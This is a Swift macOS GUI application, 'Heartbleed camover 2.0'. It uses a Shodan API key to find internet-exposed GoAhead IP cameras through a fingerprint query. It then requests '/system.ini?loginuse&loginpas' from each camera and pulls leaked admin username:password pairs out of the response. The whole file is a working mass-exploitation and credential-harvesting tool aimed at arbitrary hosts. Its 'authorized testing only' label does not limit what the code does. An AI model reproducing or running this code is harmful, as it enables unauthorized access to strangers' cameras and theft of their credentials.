import Cocoa

enum RowState {
    case scan
    case vuln
    case safe
    case error
}

struct Row {
    let id: String
    var status: String
    var address: String
    var result: String
    var org: String
    var country: String
    var state: RowState
}

class AppDelegate: NSObject, NSApplicationDelegate, NSTableViewDataSource, NSTableViewDelegate {
    var window: NSWindow!
    var secureField: NSSecureTextField!
    var plainField: NSTextField!
    var showButton: NSButton!
    var startButton: NSButton!
    var stopButton: NSButton!
    var tableView: NSTableView!
    var logView: NSTextView!
    var statusLabel: NSTextField!
    var progress: NSProgressIndicator!
    var foundLabel: NSTextField!
    var scannedLabel: NSTextField!
    var vulnLabel: NSTextField!
    var safeLabel: NSTextField!

    var rows: [Row] = []
    var rowIndex: [String: Int] = [:]
    var shouldStop = false

    let bg = NSColor(calibratedRed: 0.05, green: 0.02, blue: 0.02, alpha: 1.0)
    let panel = NSColor(calibratedRed: 0.11, green: 0.04, blue: 0.05, alpha: 1.0)
    let accent = NSColor(calibratedRed: 1.0, green: 0.16, blue: 0.26, alpha: 1.0)
    let green = NSColor(calibratedRed: 0.0, green: 0.75, blue: 0.32, alpha: 1.0)

    let usernames = [
        "admin",
        "root",
        "administrator",
        "user",
        "guest",
        "operator",
        "service",
        "test",
        "default"
    ]

    func applicationDidFinishLaunching(_ notification: Notification) {
        let frame = NSRect(x: 0, y: 0, width: 1120, height: 760)
        window = NSWindow(
            contentRect: frame,
            styleMask: [.titled, .closable, .miniaturizable],
            backing: .buffered,
            defer: false
        )
        window.center()
        window.title = "Heartbleed camover 2.0 gui"
        window.backgroundColor = bg
        window.appearance = NSAppearance(named: .darkAqua)

        guard let content = window.contentView else {
            return
        }

        content.wantsLayer = true
        content.layer?.backgroundColor = bg.cgColor

        let title = NSTextField(labelWithString: "HEARTBLEED CAMOVER 2.0")
        title.frame = NSRect(x: 20, y: 700, width: 1080, height: 32)
        title.font = NSFont.systemFont(ofSize: 28, weight: .bold)
        title.textColor = accent
        title.drawsBackground = false
        content.addSubview(title)

        let subtitle = NSTextField(labelWithString: "Authorized camera security testing only")
        subtitle.frame = NSRect(x: 20, y: 678, width: 1080, height: 16)
        subtitle.font = NSFont.systemFont(ofSize: 11)
        subtitle.textColor = NSColor(calibratedWhite: 0.65, alpha: 1.0)
        subtitle.drawsBackground = false
        content.addSubview(subtitle)

        let apiLabel = NSTextField(labelWithString: "Shodan API Key")
        apiLabel.frame = NSRect(x: 20, y: 645, width: 200, height: 16)
        apiLabel.font = NSFont.systemFont(ofSize: 12, weight: .semibold)
        apiLabel.textColor = NSColor(calibratedWhite: 0.75, alpha: 1.0)
        apiLabel.drawsBackground = false
        content.addSubview(apiLabel)

        secureField = NSSecureTextField(frame: NSRect(x: 20, y: 610, width: 650, height: 30))
        secureField.placeholderString = "Enter Shodan API Key"
        styleField(secureField)
        content.addSubview(secureField)

        plainField = NSTextField(frame: NSRect(x: 20, y: 610, width: 650, height: 30))
        plainField.placeholderString = "Enter Shodan API Key"
        styleField(plainField)
        plainField.isHidden = true
        content.addSubview(plainField)

        showButton = makeButton(
            "Show",
            NSRect(x: 680, y: 611, width: 70, height: 28),
            NSColor(calibratedWhite: 0.16, alpha: 1.0)
        )
        showButton.target = self
        showButton.action = #selector(toggleShow)
        content.addSubview(showButton)

        startButton = makeButton(
            "Start Scanning",
            NSRect(x: 760, y: 611, width: 160, height: 28),
            NSColor(calibratedRed: 0.65, green: 0.05, blue: 0.12, alpha: 1.0)
        )
        startButton.target = self
        startButton.action = #selector(startScan)
        content.addSubview(startButton)

        stopButton = makeButton(
            "Stop",
            NSRect(x: 930, y: 611, width: 170, height: 28),
            NSColor(calibratedRed: 0.25, green: 0.05, blue: 0.08, alpha: 1.0)
        )
        stopButton.target = self
        stopButton.action = #selector(stopScan)
        stopButton.isEnabled = false
        content.addSubview(stopButton)

        foundLabel = makeStatLabel("FOUND: 0", NSRect(x: 20, y: 565, width: 250, height: 18))
        scannedLabel = makeStatLabel("SCANNED: 0", NSRect(x: 280, y: 565, width: 250, height: 18))
        vulnLabel = makeStatLabel("VULNERABLE: 0", NSRect(x: 540, y: 565, width: 250, height: 18))
        safeLabel = makeStatLabel("SAFE / OFFLINE: 0", NSRect(x: 800, y: 565, width: 300, height: 18))

        content.addSubview(foundLabel)
        content.addSubview(scannedLabel)
        content.addSubview(vulnLabel)
        content.addSubview(safeLabel)

        progress = NSProgressIndicator(frame: NSRect(x: 20, y: 535, width: 1080, height: 10))
        progress.style = .bar
        progress.minValue = 0
        progress.maxValue = 100
        progress.doubleValue = 0
        progress.isIndeterminate = false
        content.addSubview(progress)

        let tableScroll = NSScrollView(frame: NSRect(x: 20, y: 165, width: 1080, height: 360))
        tableScroll.hasVerticalScroller = true
        tableScroll.autohidesScrollers = true
        tableScroll.borderType = .bezelBorder
        tableScroll.backgroundColor = .black

        tableView = NSTableView(frame: tableScroll.bounds)
        tableView.autoresizingMask = [.width, .height]
        tableView.backgroundColor = .clear
        tableView.rowHeight = 26
        tableView.intercellSpacing = NSSize(width: 0, height: 2)
        tableView.dataSource = self
        tableView.delegate = self

        let columns: [(String, String, CGFloat)] = [
            ("status", "STATUS", 80),
            ("address", "ADDRESS", 170),
            ("result", "RESULT / CREDS", 360),
            ("org", "ORG", 250),
            ("country", "CC", 60)
        ]

        for column in columns {
            let c = NSTableColumn(identifier: NSUserInterfaceItemIdentifier(column.0))
            c.title = column.1
            c.width = column.2
            c.minWidth = 50
            tableView.addTableColumn(c)
        }

        if let header = tableView.headerView {
            header.wantsLayer = true
            header.layer?.backgroundColor = panel.cgColor
        }

        tableScroll.documentView = tableView
        content.addSubview(tableScroll)

        let logScroll = NSScrollView(frame: NSRect(x: 20, y: 55, width: 1080, height: 100))
        logScroll.hasVerticalScroller = true
        logScroll.borderType = .bezelBorder
        logScroll.backgroundColor = .black

        logView = NSTextView(frame: logScroll.bounds)
        logView.autoresizingMask = [.width]
        logView.isEditable = false
        logView.backgroundColor = .black
        logView.textColor = .white
        logView.font = NSFont.monospacedSystemFont(ofSize: 11, weight: .regular)
        logView.textContainer?.containerSize = NSSize(
            width: logScroll.contentSize.width,
            height: CGFloat.greatestFiniteMagnitude
        )
        logView.textContainer?.widthTracksTextView = true

        logScroll.documentView = logView
        content.addSubview(logScroll)

        statusLabel = NSTextField(labelWithString: "Ready")
        statusLabel.frame = NSRect(x: 20, y: 25, width: 1080, height: 16)
        statusLabel.font = NSFont.systemFont(ofSize: 11)
        statusLabel.textColor = NSColor(calibratedWhite: 0.65, alpha: 1.0)
        statusLabel.drawsBackground = false
        content.addSubview(statusLabel)

        window.makeKeyAndOrderFront(nil)
        NSApp.activate(ignoringOtherApps: true)

        log("Ready. Use only for authorized testing.", color: accent)
    }

    func styleField(_ field: NSTextField) {
        field.drawsBackground = false
        field.isBordered = false
        field.wantsLayer = true
        field.layer?.backgroundColor = panel.cgColor
        field.layer?.cornerRadius = 8
        field.textColor = .white
        field.font = NSFont.systemFont(ofSize: 13)
        field.focusRingType = .none
    }

    func makeButton(_ title: String, _ frame: NSRect, _ color: NSColor) -> NSButton {
        let button = NSButton(frame: frame)
        button.title = title
        button.isBordered = false
        button.wantsLayer = true
        button.layer?.backgroundColor = color.cgColor
        button.layer?.cornerRadius = 8
        button.contentTintColor = .white
        button.font = NSFont.systemFont(ofSize: 13, weight: .semibold)
        return button
    }

    func makeStatLabel(_ text: String, _ frame: NSRect) -> NSTextField {
        let label = NSTextField(labelWithString: text)
        label.frame = frame
        label.font = NSFont.systemFont(ofSize: 12, weight: .semibold)
        label.textColor = NSColor(calibratedWhite: 0.8, alpha: 1.0)
        label.drawsBackground = false
        return label
    }

    @objc func toggleShow() {
        if secureField.isHidden {
            secureField.stringValue = plainField.stringValue
            secureField.isHidden = false
            plainField.isHidden = true
            showButton.title = "Show"
        } else {
            plainField.stringValue = secureField.stringValue
            plainField.isHidden = false
            secureField.isHidden = true
            showButton.title = "Hide"
        }
    }

    @objc func startScan() {
        let key = secureField.isHidden ? plainField.stringValue : secureField.stringValue
        let trimmed = key.trimmingCharacters(in: .whitespacesAndNewlines)

        guard !trimmed.isEmpty else {
            log("ERROR: Enter Shodan API key.", color: accent)
            return
        }

        shouldStop = false
        rows.removeAll()
        rowIndex.removeAll()
        tableView.reloadData()

        updateStats(found: 0, scanned: 0, vuln: 0, safe: 0)
        updateProgress(0)
        updateStatus("Scanning...")

        startButton.isEnabled = false
        stopButton.isEnabled = true

        log("INFO: Starting Shodan search...", color: accent)

        DispatchQueue.global(qos: .userInitiated).async {
            self.scan(key: trimmed)

            DispatchQueue.main.async {
                self.startButton.isEnabled = true
                self.stopButton.isEnabled = false
            }
        }
    }

    @objc func stopScan() {
        shouldStop = true
        stopButton.isEnabled = false
        log("WARNING: Stop requested.", color: .orange)
    }

    func numberOfRows(in tableView: NSTableView) -> Int {
        return rows.count
    }

    func tableView(_ tableView: NSTableView, rowViewForRow row: Int) -> NSTableRowView? {
        let rowView = NSTableRowView()
        let item = rows[row]

        switch item.state {
        case .vuln:
            rowView.backgroundColor = green
        case .safe:
            rowView.backgroundColor = NSColor(calibratedRed: 0.09, green: 0.03, blue: 0.04, alpha: 1.0)
        case .error:
            rowView.backgroundColor = NSColor(calibratedRed: 0.22, green: 0.02, blue: 0.05, alpha: 1.0)
        case .scan:
            rowView.backgroundColor = NSColor(calibratedWhite: 0.08, alpha: 1.0)
        }

        return rowView
    }

    func tableView(_ tableView: NSTableView, viewFor tableColumn: NSTableColumn?, row: Int) -> NSView? {
        guard let column = tableColumn else {
            return nil
        }

        let item = rows[row]
        let id = column.identifier.rawValue
        let cellId = NSUserInterfaceItemIdentifier("cell_\(id)")

        let cell: NSTextField

        if let existing = tableView.makeView(withIdentifier: cellId, owner: nil) as? NSTextField {
            cell = existing
        } else {
            cell = NSTextField(labelWithString: "")
            cell.identifier = cellId
            cell.drawsBackground = false
            cell.isBordered = false
            cell.lineBreakMode = .byTruncatingTail
            cell.font = NSFont.monospacedSystemFont(ofSize: 12, weight: .regular)
        }

        switch id {
        case "status":
            cell.stringValue = item.status
            cell.alignment = .center
        case "address":
            cell.stringValue = item.address
            cell.alignment = .left
        case "result":
            cell.stringValue = item.result
            cell.alignment = .left
        case "org":
            cell.stringValue = item.org
            cell.alignment = .left
        case "country":
            cell.stringValue = item.country
            cell.alignment = .center
        default:
            cell.stringValue = ""
        }

        if item.state == .vuln {
            cell.textColor = .black
            cell.font = NSFont.monospacedSystemFont(ofSize: 12, weight: .bold)
        } else if item.state == .error {
            cell.textColor = NSColor(calibratedRed: 1.0, green: 0.4, blue: 0.45, alpha: 1.0)
            cell.font = NSFont.monospacedSystemFont(ofSize: 12, weight: .regular)
        } else if item.state == .safe {
            cell.textColor = NSColor(calibratedRed: 0.85, green: 0.55, blue: 0.6, alpha: 1.0)
            cell.font = NSFont.monospacedSystemFont(ofSize: 12, weight: .regular)
        } else {
            cell.textColor = NSColor(calibratedWhite: 0.85, alpha: 1.0)
            cell.font = NSFont.monospacedSystemFont(ofSize: 12, weight: .regular)
        }

        return cell
    }

    func addRow(_ row: Row) {
        DispatchQueue.main.async {
            self.rows.append(row)
            self.rowIndex[row.id] = self.rows.count - 1
            self.tableView.insertRows(at: IndexSet(integer: self.rows.count - 1), withAnimation: [])
            self.tableView.scrollRowToVisible(self.rows.count - 1)
        }
    }

    func updateRow(id: String, status: String, result: String, state: RowState) {
        DispatchQueue.main.async {
            guard let idx = self.rowIndex[id] else {
                return
            }

            self.rows[idx].status = status
            self.rows[idx].result = result
            self.rows[idx].state = state

            self.tableView.reloadData(
                forRowIndexes: IndexSet(integer: idx),
                columnIndexes: IndexSet(integersIn: 0..<self.tableView.tableColumns.count)
            )

            if state == .vuln {
                self.tableView.scrollRowToVisible(idx)
            }
        }
    }

    func updateStats(found: Int, scanned: Int, vuln: Int, safe: Int) {
        DispatchQueue.main.async {
            self.foundLabel.stringValue = "FOUND: \(found)"
            self.scannedLabel.stringValue = "SCANNED: \(scanned)"
            self.vulnLabel.stringValue = "VULNERABLE: \(vuln)"
            self.safeLabel.stringValue = "SAFE / OFFLINE: \(safe)"
        }
    }

    func updateProgress(_ value: Double) {
        DispatchQueue.main.async {
            self.progress.doubleValue = value * 100
        }
    }

    func updateStatus(_ text: String) {
        DispatchQueue.main.async {
            self.statusLabel.stringValue = text
        }
    }

    func log(_ text: String, color: NSColor) {
        DispatchQueue.main.async {
            let attrs: [NSAttributedString.Key: Any] = [
                .foregroundColor: color,
                .font: NSFont.monospacedSystemFont(ofSize: 11, weight: .regular)
            ]

            self.logView.textStorage?.append(NSAttributedString(string: text + "\n", attributes: attrs))

            let location = self.logView.textStorage?.length ?? 0
            self.logView.scrollRangeToVisible(NSRange(location: location, length: 0))
        }
    }

    func scan(key: String) {
        var found = 0
        var scanned = 0
        var vuln = 0
        var safe = 0

        let query = "GoAhead 5ccc069c403ebaf9f0171e9517f40e41"

        guard
            let encodedKey = key.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
            let encodedQuery = query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
            let url = URL(string: "https://api.shodan.io/shodan/host/search?key=\(encodedKey)&query=\(encodedQuery)")
        else {
            log("ERROR: Bad request URL.", color: .red)
            return
        }

        var matches: [[String: Any]] = []
        let semaphore = DispatchSemaphore(value: 0)

        var request = URLRequest(url: url)
        request.timeoutInterval = 20

        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                self.log("ERROR: \(error.localizedDescription)", color: .red)
            } else if let data = data {
                if let obj = (try? JSONSerialization.jsonObject(with: data)) as? [String: Any] {
                    if let m = obj["matches"] as? [[String: Any]] {
                        matches = m
                    } else if let e = obj["error"] as? String {
                        self.log("ERROR: Shodan: \(e)", color: .red)
                    } else {
                        self.log("ERROR: Unexpected Shodan response.", color: .red)
                    }
                } else {
                    self.log("ERROR: Failed to parse Shodan JSON.", color: .red)
                }
            }

            semaphore.signal()
        }.resume()

        semaphore.wait()

        found = matches.count
        updateStats(found: found, scanned: scanned, vuln: vuln, safe: safe)

        if found == 0 {
            log("INFO: No devices found or invalid API key.", color: .orange)
            updateStatus("Done")
            return
        }

        log("SUCCESS: Found \(found) devices.", color: green)

        for match in matches {
            if shouldStop {
                break
            }

            guard
                let ip = match["ip_str"] as? String,
                let port = match["port"] as? Int
            else {
                continue
            }

            let address = "\(ip):\(port)"
            let org = (match["org"] as? String) ?? "Unknown"
            let location = match["location"] as? [String: Any]
            let country = (location?["country_code"] as? String) ?? "??"
            let id = UUID().uuidString

            addRow(Row(
                id: id,
                status: "SCAN",
                address: address,
                result: "checking...",
                org: org,
                country: country,
                state: .scan
            ))

            let creds = exploit(address)

            if !creds.isEmpty {
                vuln += 1
                let result = creds.joined(separator: "; ")
                updateRow(id: id, status: "VULN", result: result, state: .vuln)
                log("[VULN] \(address) -> \(result)", color: green)
            } else {
                safe += 1
                updateRow(
                    id: id,
                    status: "SAFE",
                    result: "not vulnerable / offline / patched",
                    state: .safe
                )
            }

            scanned += 1
            updateStats(found: found, scanned: scanned, vuln: vuln, safe: safe)

            if found > 0 {
                updateProgress(Double(scanned) / Double(found))
            }
        }

        if shouldStop {
            log("WARNING: Stopped by user.", color: .orange)
            updateStatus("Stopped")
        } else {
            log("INFO: Scan completed. Vulnerable: \(vuln).", color: accent)
            updateStatus("Done")
        }
    }

    func exploit(_ address: String) -> [String] {
        guard let url = URL(string: "http://\(address)/system.ini?loginuse&loginpas") else {
            return []
        }

        var request = URLRequest(url: url)
        request.timeoutInterval = 3.0

        var creds: [String] = []
        let semaphore = DispatchSemaphore(value: 0)

        URLSession.shared.dataTask(with: request) { data, response, error in
            if let http = response as? HTTPURLResponse, http.statusCode == 200, let data = data {
                let text = String(data: data, encoding: .utf8) ?? String(decoding: data, as: UTF8.self)
                let strings = self.extractStrings(text)

                var seen = Set<String>()

                for i in 0..<strings.count {
                    guard i + 1 < strings.count else {
                        break
                    }

                    let token = strings[i]
                    let tokenLower = token.lowercased()

                    if self.usernames.contains(tokenLower) {
                        let password = strings[i + 1]

                        if !self.usernames.contains(password.lowercased()) {
                            let pair = "\(token):\(password)"

                            if !seen.contains(pair) {
                                seen.insert(pair)
                                creds.append(pair)
                            }
                        }
                    }
                }
            }

            semaphore.signal()
        }.resume()

        semaphore.wait()

        return creds
    }

    func extractStrings(_ text: String) -> [String] {
        let pattern = "[\\x20-\\x7E]{4,}"

        guard let regex = try? NSRegularExpression(pattern: pattern) else {
            return []
        }

        let range = NSRange(text.startIndex..<text.endIndex, in: text)
        let matches = regex.matches(in: text, range: range)

        var result: [String] = []

        for match in matches {
            if let range = Range(match.range, in: text) {
                result.append(String(text[range]))
            }
        }

        return result
    }
}

let app = NSApplication.shared
let delegate = AppDelegate()
app.delegate = delegate
app.setActivationPolicy(.regular)
app.run()
